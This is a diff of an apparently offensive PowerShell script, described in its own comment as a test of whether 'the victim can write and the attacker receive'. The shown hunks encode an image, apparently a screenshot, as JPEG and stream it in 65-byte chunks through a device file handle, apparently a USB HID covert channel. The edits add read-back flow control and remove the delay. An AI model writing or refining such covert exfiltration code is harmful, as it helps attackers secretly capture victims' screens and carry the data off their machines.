@@ -1,7 +1,7 @@
-#-A simple test to see if the victim can write and the attacker recieve
+#-A simple test to see if the victim can write and the attacker receive
 
 # Open file handle to device
-$cs =@" 
+$cs =@"
 using System;
 using System.IO;
 using Microsoft.Win32.SafeHandles;
@@ -55,17 +55,20 @@ $bmp.Save($pic,$jpegCodecInfo,$encoderParams)
 $pic.Seek(0, [System.IO.SeekOrigin]::Begin)
 $picbytes = New-Object Byte[] (65)
 $inbytes = New-Object Byte[] (65)
+$nullbytes = New-Object Byte[] (65)
+
 $picbytes[1] = 63
 while ($pic.Position -lt $pic.Length) {
-	$null =$pic.Read($picbytes, 2, 63)
-	#$null = $filehandle.Read($inbytes, 0, 65)
-	#if ($inbytes[1] -band 128) {
-		#Write-Output .
-	#} else {
+  $null = $filehandle.Write($nullbytes, 0, 65)
+	$null = $filehandle.Read($inbytes, 0, 65)
+	if ($inbytes[1] -band 128) {
+		Write-Output .
+	} else {
+		$null = $pic.Read($picbytes, 2, 63)
 		$null = $filehandle.Write($picbytes, 0, 65)
-	#}
+	}
 	$pic.Position
-	sleep -m 32
+#	sleep -m 32
 }
 #$gzipStream.Close()
 $filehandle.Close()
